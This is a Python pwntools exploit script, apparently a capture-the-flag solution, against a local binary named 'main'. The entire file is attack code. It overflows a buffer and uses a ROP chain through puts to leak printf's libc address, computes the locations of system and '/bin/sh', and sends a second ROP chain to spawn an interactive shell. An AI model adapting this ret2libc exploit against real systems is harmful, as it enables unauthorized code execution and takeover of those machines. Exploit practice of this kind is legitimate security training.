from pwn import *
target = process('./main')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#target = process('./main',env={"LD_PRELOAD":"libc6_2.30-0ubuntu2_amd64.so"})
#libc = ELF('libc6_2.30-0ubuntu2_amd64.so')
context.terminal=["tmux","split","-h"]
#gdb.attach(target)
print(target.recvuntil("length:"))
target.sendline("-1")
print(target.recvuntil("ID:"))
target.send("--22")
print(target.recvuntil("message:"))
payload = "A"*120
poprdi = 0x400a93
poprsir15 = 0x400a91
startf = 0x4007b0
puts_plt = 0x400700
read_plt = 0x400730
printf_got = 0x601028
#one_gadget_off=0xe652b
payload += p64(poprdi)
payload += p64(printf_got)
payload += p64(puts_plt)
payload += p64(startf)
payload+=p64(0x00)
target.send(payload)
print(target.recvuntil("Goodbye!\n"))
leak = target.recvline().strip("\n")
printf_libc = u64(leak+"\x00"*(8-len(leak)))
print(hex(printf_libc))
libc_base = printf_libc-libc.symbols["printf"]
libc_system = libc_base+libc.symbols["system"]
libc_binsh = libc_base+libc.search("/bin/sh\x00").next()
#libc_onegadget=libc_base+one_gadget_off
print(hex(libc_base))
print(hex(libc_system))
print(hex(libc_binsh))
#print(hex(libc_onegadget))
'''
print(target.recvuntil("length:"))
pause()
target.send("-1")
print(target.recvuntil("ID:"))
pause()
target.send("--22")
print(target.recvuntil("message:"))
'''
pause()
payload2 = "B"*120
payload2 +=p64(poprsir15)
payload2 +=p64(0xdeadbeef)
payload2 +=p64(0xdeadbeef)
payload2 += p64(poprdi)
payload2 += p64(libc_binsh)
payload2 += p64(libc_system)
#payload2+=p64(libc_onegadget)
#payload2 +=p64(0x400a28)
target.sendline(payload2)
target.sendline(payload2)
target.sendline(payload2)
target.sendline(payload2)
target.sendline(payload2)
target.sendline(payload2)
target.interactive()
